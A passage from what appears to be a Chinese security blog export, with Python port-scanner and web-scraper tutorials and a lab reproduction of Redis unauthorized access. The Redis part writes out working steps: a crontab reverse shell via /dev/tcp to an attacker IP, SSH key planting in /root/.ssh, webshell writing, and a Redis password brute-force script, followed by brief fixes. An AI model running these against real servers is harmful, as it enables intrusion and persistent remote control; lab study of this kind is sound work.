<p>旧版（爆破功能）</p>
<p><a href="https://www.zerochen.top/download/Redis/redis.py">https://www.zerochen.top/download/Redis/redis.py</a></p>
<p>新版（pocsuite3模块）</p>
<p><a href="https://www.zerochen.top/download/Redis/89715_redis_login_bypass.py">https://www.zerochen.top/download/Redis/89715_redis_login_bypass.py</a></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Python之端口扫描</title>
    <url>/article/Python%E4%B9%8B%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>借用端口扫描脚本，记录socket模块和threading模块知识点，以供日后查询。</p>
<h1 id="二、模块梳理"><a href="#二、模块梳理" class="headerlink" title="二、模块梳理"></a>二、模块梳理</h1><h2 id="socket模块"><a href="#socket模块" class="headerlink" title="socket模块"></a>socket模块</h2><p>介绍：网络发包请求模块</p>
<p>使用</p>
<pre class="highlight"><span class="line">import socket						# 导包</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 		# 创建socket对象</span><br><span class="line">s.bind = ((host,port))				# 绑定端口</span><br><span class="line">s.close								# 断开连接</span><br><span class="line">s.send(msg.decode(&#x27;utf-8&#x27;))			# 发送数据</span><br><span class="line">s.recv(1024)						# 接受数据</span><br><span class="line">s.settimeout()						# 设置超时时间，单位秒</span><br><span class="line">s.sendall							# 发送完整TCP数据</span><br><span class="line">s.sendto							# 发送udp数据</span><br><span class="line"></span><br><span class="line"># 服务端</span><br><span class="line">s.listen							# 设置最大连接数</span><br><span class="line">csocket,addr = s.accept()			# 建立客户端连接</span><br><span class="line"></span><br><span class="line"># 客户端</span><br><span class="line">s.connect((host,port))				# 连接服务器</span><br></pre>



<h2 id="threading模块"><a href="#threading模块" class="headerlink" title="threading模块"></a>threading模块</h2><p>介绍：多线程模块</p>
<p>使用</p>
<pre class="highlight"><span class="line">import threading							# 导包</span><br><span class="line">t = threading.Thread(target=要执行的函数)		# 设置要开启线程的函数</span><br><span class="line">t.start()									# 开启线程</span><br><span class="line"># linux可直接Ctrl+c结束脚本，Windows下失效</span><br></pre>

<p>守护进程</p>
<pre class="highlight"><span class="line">t = threading.Thread(target=要执行的函数, daemon=True)   # 设置守护进程，父进程结束则结束全部进程</span><br><span class="line">t.start()</span><br><span class="line"></span><br><span class="line"># 主线程空循环，防止结束，同时用来接收中断信号</span><br><span class="line">while True:</span><br><span class="line">	pass</span><br><span class="line"># 用于Windows下接收Ctrl+c信号，结束脚本程序。</span><br></pre>

<p>线程锁，防止多个线程同时操作一个资源对象</p>
<pre class="highlight"><span class="line">lock = threading.RLock() 	# 多线程开始之前定义</span><br><span class="line">lock.acquire()				# 获取锁</span><br><span class="line">lock.release()				# 释放锁</span><br></pre>

<h1 id="三、代码"><a href="#三、代码" class="headerlink" title="三、代码"></a>三、代码</h1><pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：借用端口扫描项目，梳理套接字、多线程（守护进程、线程锁）的简单使用</span><br><span class="line">    author：chen</span><br><span class="line">    date:2021-6-27</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import queue</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line"># 全局变量，队列，用来依次存储端口号</span><br><span class="line">q = queue.Queue()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def portScan():</span><br><span class="line">    while not q.empty():</span><br><span class="line">        port = q.get()</span><br><span class="line">        # 设置套接字连接</span><br><span class="line">        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        # 设置超时重连时间，单位秒，不设置会导致发包速度极慢，默认15秒</span><br><span class="line">        c.settimeout(0.5)</span><br><span class="line">        # connect.ex()会一直尝试连接，连接成功返回0，失败返回错误信息（key值）</span><br><span class="line">        if c.connect_ex((host, port)) == 0:</span><br><span class="line">            print(&quot;%s:%d is open&quot; % (host, port))</span><br><span class="line">            s = host + &quot;:&quot; + str(port)</span><br><span class="line">            # 开启进程锁，多线程写入数据</span><br><span class="line">            lock.acquire()</span><br><span class="line">            with open(&#x27;./ports.txt&#x27;, &#x27;a&#x27;) as fp:</span><br><span class="line">                fp.write(s + &quot;\n&quot;)</span><br><span class="line">                # 释放锁</span><br><span class="line">            lock.release()</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;%s:%d not open&quot; % (host, port))</span><br><span class="line">        # 关闭套接字连接</span><br><span class="line">        c.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 独立执行时的程序入口</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    #argv用来接收用户输入，按输入次序分别为argv[0-n],argv[0]表示脚本名</span><br><span class="line">    if len(sys.argv) &lt; 3:</span><br><span class="line">        print(&quot;请以以下格式输入：&quot;)</span><br><span class="line">        print(&quot;python portScan.py ip 线程数&quot;)</span><br><span class="line">    host = sys.argv[1]</span><br><span class="line">    thread_num = int(sys.argv[2])</span><br><span class="line">    # 在进程开始前，定义进程锁，不可在进程中定义锁，否则线程自己使用自己的锁，则失去进程锁的意义</span><br><span class="line">    lock = threading.RLock()</span><br><span class="line"></span><br><span class="line">    for port in range(1, 65536):</span><br><span class="line">        q.put(port)</span><br><span class="line">    for i in range(thread_num):</span><br><span class="line">        # 开启守护进程</span><br><span class="line">        t = threading.Thread(target=portScan, daemon=True)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    # 设置主进程死循环，方便接收中断信号</span><br><span class="line">    # 因为设置了守护进程，所以主进程结束，子进程也会立刻结束</span><br><span class="line">    while 1:</span><br><span class="line">        pass</span><br></pre>



<h1 id="四、下载"><a href="#四、下载" class="headerlink" title="四、下载"></a>四、下载</h1><p><a href="https://www.zerochen.top/download/Port/portScan.py">https://www.zerochen.top/download/Port/portScan.py</a></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>portscan</tag>
      </tags>
  </entry>
  <entry>
    <title>Python之网络爬虫</title>
    <url>/article/Python%E4%B9%8B%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/</url>
    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>借用网络爬虫脚本，记录下requests模块和bs4模块的知识点，以供日后查阅。</p>
<h1 id="二、模块梳理"><a href="#二、模块梳理" class="headerlink" title="二、模块梳理"></a>二、模块梳理</h1><h2 id="requests模块"><a href="#requests模块" class="headerlink" title="requests模块"></a>requests模块</h2><p>介绍：发送简单请求，获取响应</p>
<p>使用：</p>
<pre class="highlight"><span class="line">import requests				# 导包</span><br><span class="line">res = requests.get(url)		# 发送get请求包（可换成.post）</span><br><span class="line">res.text					# 获取返回包内容</span><br><span class="line">res.request					# 获取请求包内容</span><br><span class="line">res.encoding  				# 获取页面编码格式</span><br><span class="line">res.content			  		# http响应内容的二进制形式</span><br><span class="line">res.status_code				# http响应码，200响应成功，404失败</span><br></pre>



<h2 id="BeautifulSoup模块"><a href="#BeautifulSoup模块" class="headerlink" title="BeautifulSoup模块"></a>BeautifulSoup模块</h2><p>介绍：用于解析html/xml。</p>
<p>使用</p>
<pre class="highlight"><span class="line">from bs4 import BeautifulSoup				# 导包</span><br><span class="line">soup = BeautifulSoup(&#x27;html&#x27;, &#x27;lxml&#x27;)		# 获取html属性</span><br><span class="line">soup.title									# 获取其中title内容,包括标签</span><br><span class="line">soup.title.string							# 仅获取title</span><br><span class="line">soup.select									# 指定某个元素下某个标签</span><br><span class="line">	soup.select(&#x27;.book-mulu &gt; ul &gt; li &gt; a&#x27;)</span><br><span class="line">	同</span><br><span class="line">	soup.find(&#x27;div&#x27;,class_=&#x27;chapter_content&#x27;)</span><br><span class="line">soup.text									# 获取标签内容</span><br><span class="line">find_all									# 查找所有符合条件的元素</span><br><span class="line">find										# 匹配第一个元素</span><br><span class="line"></span><br></pre>



<h1 id="三、代码"><a href="#三、代码" class="headerlink" title="三、代码"></a>三、代码</h1><pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：借用网络爬虫脚本，梳理bs4、requests的简单使用</span><br><span class="line">    author：chen</span><br><span class="line">    date:2021-6-27</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line"># 自定义请求头</span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def page_link(url):</span><br><span class="line">    con = &#x27;&#x27;</span><br><span class="line">    reponse = requests.get(url=url, headers=headers)</span><br><span class="line">    # 获取当前页面编码格式</span><br><span class="line">    code = reponse.encoding</span><br><span class="line">    # 对响应包的内容解码</span><br><span class="line">    page_text = reponse.text.encode(code).decode(&#x27;gbk&#x27;)</span><br><span class="line">    # 使用bs获取指定标签内容（需绑定解析器lxml）</span><br><span class="line">    soup = BeautifulSoup(page_text, &quot;lxml&quot;).select(&#x27;.onearcxsbd &gt; p&#x27;)</span><br><span class="line">    for i in soup:</span><br><span class="line">        # print(i.text)</span><br><span class="line">        con = con + i.text</span><br><span class="line">    return con</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 程序入口</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    url = &#x27;https://www.xyyuedu.com/gdmz/sidamingzhu/sgyy/&#x27;      # 目标地址</span><br><span class="line">    reponse = requests.get(url=url, headers=headers)            # 获取请求</span><br><span class="line">    # print(reponse.text)</span><br><span class="line">    code = reponse.encoding                                     # 获取编码方式</span><br><span class="line">    # code = reponse.apparent_encoding</span><br><span class="line">    # print(code)</span><br><span class="line">    page_text = reponse.text.encode(code).decode(&#x27;gbk&#x27;)         # 先以网页原编码方式编码，在以指定格式解码，注意，数据仅以编码方式存储，但未进行编码</span><br><span class="line">    # print(page_text)</span><br><span class="line"></span><br><span class="line">    soup = BeautifulSoup(page_text, &quot;lxml&quot;)                     # 创建soup对象并指定解析器</span><br><span class="line">    aAttr = soup.select(&#x27;.zhangjie2 &gt; li &gt; a&#x27;)                  # 获得url所在的标签信息</span><br><span class="line">    # print(aAttr)</span><br><span class="line"></span><br><span class="line">    for i in aAttr:</span><br><span class="line">        # print(i.text)</span><br><span class="line">        title = i.text</span><br><span class="line">        link = &#x27;https://www.xyyuedu.com&#x27; + i[&#x27;href&#x27;]        # 获取章节连接</span><br><span class="line">        content = page_link(link)</span><br><span class="line">        print(&#x27;开始下载 \n&#x27; + title)</span><br><span class="line">        # print(title)</span><br><span class="line">        # print(link)</span><br><span class="line">        # print(content)</span><br><span class="line">        with open(&#x27;./三国演义.txt&#x27;, &#x27;a&#x27;, encoding=&#x27;utf-8&#x27;) as fp:</span><br><span class="line">            fp.write(title + &#x27;\n&#x27; + content + &#x27;\n\n\n&#x27;)</span><br><span class="line">            print(title + &#x27;\n&#x27; + &#x27;下载结束&#x27; + &#x27;\n&#x27;)</span><br></pre>



<h1 id="4、下载"><a href="#4、下载" class="headerlink" title="4、下载"></a>4、下载</h1><p><a href="https://www.zerochen.top/download/Scan/pc_sg.py">https://www.zerochen.top/download/Scan/pc_sg.py</a></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>BeautifulSoup模块</tag>
        <tag>requests模块</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis未授权访问漏洞复现</title>
    <url>/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h1><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p>
<h1 id="二、漏洞特征"><a href="#二、漏洞特征" class="headerlink" title="二、漏洞特征"></a>二、漏洞特征</h1><p>开放6379端口，可尝试免密登录</p>
<p>漏洞版本：Redis 2.x，3.x，4.x，5.x</p>
<pre class="highlight"><span class="line">redis-cli -h x.x.x.x</span><br><span class="line">或</span><br><span class="line">redis-cli -h x.x.x.x -p 6379</span><br></pre>

<h1 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>攻击机：Kali2020.1</p>
<p>靶机：Ubuntu20 + Redis2.8.17</p>
<p>1、下载环境</p>
<pre class="highlight"><span class="line">wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span><br></pre>

<p>2、解压并进入安装目录</p>
<pre class="highlight"><span class="line">tar xzf redis-2.8.17.tar.gz</span><br><span class="line">make</span><br></pre>

<p>报错：</p>
<pre class="highlight"><span class="line">gcc: Command not found</span><br></pre>

<p>解决：安装gcc</p>
<pre class="highlight"><span class="line">apt install gcc</span><br></pre>

<p>清理编译文件，重新编译</p>
<pre class="highlight"><span class="line">make distclean  &amp;&amp; make</span><br></pre>

<p>3、</p>
<p>拷贝关键文件</p>
<pre class="highlight"><span class="line">cp redis.conf /etc/</span><br><span class="line">cd src</span><br><span class="line">cp redis-benchmark redis-cli redis-server /usr/bin/</span><br></pre>

<p>4、启动</p>
<pre class="highlight"><span class="line">./redis-server		#src目录</span><br></pre>

<p><img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210702081136207.png" alt="image-20210702081136207.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210702081136207.png" class="lozad post-image"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="无密码登录"><a href="#无密码登录" class="headerlink" title="无密码登录"></a>无密码登录</h3><pre class="highlight"><span class="line">redis-cli -h 192.168.24.79		#登录</span><br></pre>

<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210702081439554.png" alt="image-20210702081439554" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210702081439554.png" class="lozad post-image"></p>
<p>登陆成功</p>
<h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><p>前提：登陆成功、知道路径（phpinfo或错误暴路径等）、读写权限等</p>
<p>因为没有搭建网站环境，这里写在用户根目录</p>
<pre class="highlight"><span class="line">config set dir /home/chen/</span><br><span class="line">config set dbfilename redis.php	</span><br><span class="line">set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">或</span><br><span class="line">set x &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre>

<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210702082718934.png" alt="image-20210702082718934" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210702082718934.png" class="lozad post-image"></p>
<p>靶机成功写入</p>
<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210702082834213.png" alt="image-20210702082834213" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210702082834213.png" class="lozad post-image"></p>
<h3 id="定时反弹shell"><a href="#定时反弹shell" class="headerlink" title="定时反弹shell"></a>定时反弹shell</h3><p>需要管理员权限</p>
<pre class="highlight"><span class="line">nc -lvnp 4444		# 攻击机开启监听</span><br><span class="line"></span><br><span class="line"># 连接redis，写定时反弹shell</span><br><span class="line">redis-cli -h 192.168.24.79</span><br><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line">config set dbfilename root</span><br><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.24.82/4444 0&gt;&amp;1\n\n&quot;		#每分钟执行一次反弹连接</span><br><span class="line">save</span><br></pre>

<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210702084716304.png" alt="image-20210702084716304" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210702084716304.png" class="lozad post-image"></p>
<p>注意！</p>
<p>1、Ubuntu系统需要以管理员权限更改/bin下的软链接指向</p>
<pre class="highlight"><span class="line">ln -s -f bash /bin/sh		# 定时任务bash为dash,无交互功能</span><br></pre>

<p>2、Ubuntu下定时任务乱码则不执行，需手动删除乱码</p>
<p>3、redis远程连接创建定时任务权限为644，但是定时任务权限需要为600才可执行</p>
<pre class="highlight"><span class="line">chmod 600 root</span><br></pre>

<p>解决以上坑点，成功反弹shell</p>
<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210702230552921.png" alt="image-20210702230552921" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210702230552921.png" class="lozad post-image"></p>
<p>但是这样意义不大，据说centos无以上坑点。</p>
<h3 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h3><p>1、攻击机生成ssh密钥（空密码）</p>
<pre class="highlight"><span class="line">ssh-keygen -t rsa		# 全部回车</span><br><span class="line">cd .ssh/</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt		# 写入公钥</span><br></pre>

<p>2、设置redis变量</p>
<pre class="highlight"><span class="line">cat ./key.txt | redis-cli -h 192.168.24.79 -x set tide		# 将公钥内容设置给redis变量（靶机ip）</span><br></pre>

<p>3、连接redis并写入</p>
<pre class="highlight"><span class="line">redis-cli -h 192.168.24.79</span><br><span class="line">config set dir /root/.ssh					# 默认公私钥路径</span><br><span class="line">config set dbfilename authorized_keys		# 写入authorized_keys</span><br><span class="line">save</span><br></pre>

<p>4、检查靶机文件是否写入–已写入（同样带有乱码）</p>
<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210703101552835.png" alt="image-20210703101552835" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210703101552835.png" class="lozad post-image"></p>
<p>5、攻击机进行ssh连接</p>
<pre class="highlight"><span class="line">ssh -o StrictHostKeyChecking=no 192.168.24.79		# 首次连接需要加-o StrictHostKeyChecking=no</span><br></pre>

<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210703102221333.png" alt="image-20210703102221333" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210703102221333.png" class="lozad post-image"></p>
<p>连接成功</p>
<p>（注：靶机需要安装ssh服务并关闭防火墙，或者允许22端口通过防火墙）</p>
<p>附Ubuntu安装ssh</p>
<pre class="highlight"><span class="line">sudo apt-get install openssh-server		# 安装ssh</span><br><span class="line">sudo /etc/init.d/ssh start 				# 开启ssh</span><br><span class="line">ufw allow 22/tcp						# 允许通过防火墙</span><br><span class="line">或</span><br><span class="line">sudo ufw disable						# 不建议</span><br></pre>





<h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><p>redis:4.x - redis:5.0.5版本漏洞，redis开启主从复制，主从数据相同，主redis只写，从redis只读，从而减小服务器压力。在Redis 4.x之后，Redis新增了模块功能，通过外部拓展，可以在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so恶意文件，就可以拓展新命令。</p>
<p>到这里懒癌犯了，不想搭环境了，附上脚本下载链接，直接过，遇到回头再来。</p>
<pre class="highlight"><span class="line">https://github.com/n0b0dyCN/redis-rogue-server</span><br></pre>

<p>这里还有个内网redis利用姿势–gopher协议，一并懒过去。</p>
<h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>感觉这个比较实用，弱口令yyds！</p>
<p>准备：</p>
<p>打开redis.conf配置文件，找到requirepass，去掉注释，修改后面的参数，即为密码</p>
<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210703105503697.png" alt="image-20210703105503697" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210703105503697.png" class="lozad post-image"></p>
<p>密码登录</p>
<pre class="highlight"><span class="line">redis-cli -h 192.168.24.79 -a password</span><br></pre>



<p>以上，开始编写Python脚本</p>
<pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：redis未授权访问探测 + 密码爆破</span><br><span class="line">    author: chen</span><br><span class="line">    date: 2021-07-03</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import queue</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def poc():</span><br><span class="line">    global flag</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((ip, port))</span><br><span class="line">    # 发送INFO，如果无密码则返回服务器信息，包含版本信息；如果有密码，则返回“-NOAUTH Authentication required”</span><br><span class="line">    s.send(&#x27;INFO\r\n&#x27;.encode(&#x27;utf-8&#x27;))</span><br><span class="line">    result = s.recv(1024).decode(&#x27;utf-8&#x27;)</span><br><span class="line">    if &quot;redis_version&quot; in result:</span><br><span class="line">        print(&quot;存在redis未授权访问漏洞！&quot;)</span><br><span class="line">        flag = True</span><br><span class="line">    elif &quot;Authentication&quot; in result:</span><br><span class="line">        flag = False</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;未知错误&quot;)</span><br><span class="line">        flag = None</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def burst():</span><br><span class="line">    while not q.empty():</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((ip, port))</span><br><span class="line">        _pass = q.get()</span><br><span class="line">        msg = &quot;AUTH &quot; + _pass + &quot;\r\n&quot;          # AUTH pass 为redis密码格式</span><br><span class="line">        s.send(msg.encode(&#x27;utf-8&#x27;))</span><br><span class="line">        result = s.recv(1024).decode(&#x27;utf-8&#x27;)</span><br><span class="line">        if &#x27;+OK&#x27; in result:</span><br><span class="line">            print(&quot;存在弱口令，密码为%s&quot; % _pass)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    if len(sys.argv) != 5:</span><br><span class="line">        print(&quot;请按照格式输出：\n&quot;)</span><br><span class="line">        print(&quot;redis.py 10.10.10.10 6379 字典名 线程数 \n&quot;)</span><br><span class="line"></span><br><span class="line">    flag = True</span><br><span class="line">    q = queue.Queue()</span><br><span class="line"></span><br><span class="line">    ip = sys.argv[1]</span><br><span class="line">    port = int(sys.argv[2])</span><br><span class="line">    dic = sys.argv[3]</span><br><span class="line">    thread = sys.argv[4]</span><br><span class="line"></span><br><span class="line">    poc()</span><br><span class="line"></span><br><span class="line">    if flag:</span><br><span class="line">        exit()</span><br><span class="line">    else:</span><br><span class="line">        path = os.path.dirname(os.path.realpath(__file__))      # 获取当前脚本目录</span><br><span class="line">        for i in open(path + &#x27;/&#x27; + dic):</span><br><span class="line">            q.put(i.strip())                                    # 清洗字符，去掉头尾的换行和空格</span><br><span class="line">        for i in range(int(thread)):</span><br><span class="line">            t = threading.Thread(target=burst(), daemon=True)</span><br><span class="line">            t.start()</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        pass</span><br></pre>

<p>结果：</p>
<p>空密码：</p>
<p><img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210703153927019.png" alt="image-20210703153927019" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210703153927019.png" class="lozad post-image"></p>
<p>设置密码</p>
<p><img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210703153726385.png" alt="image-20210703153726385" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210703153726385.png" class="lozad post-image"></p>
<h1 id="四、修复"><a href="#四、修复" class="headerlink" title="四、修复"></a>四、修复</h1><h2 id="指定ip登录"><a href="#指定ip登录" class="headerlink" title="指定ip登录"></a>指定ip登录</h2><p>在redis.conf文件找到# bind 127.0.0.1，去掉注释，修改为指定的登录ip</p>
<p>缺点：多点登陆失效。</p>
<h2 id="增加密码"><a href="#增加密码" class="headerlink" title="增加密码"></a>增加密码</h2><p>打开redis.conf配置文件，找到requirepass，去掉注释，修改后面的参数，即为密码</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Redis未授权访问</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入方法总结</title>
    <url>/article/SQL%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</url>
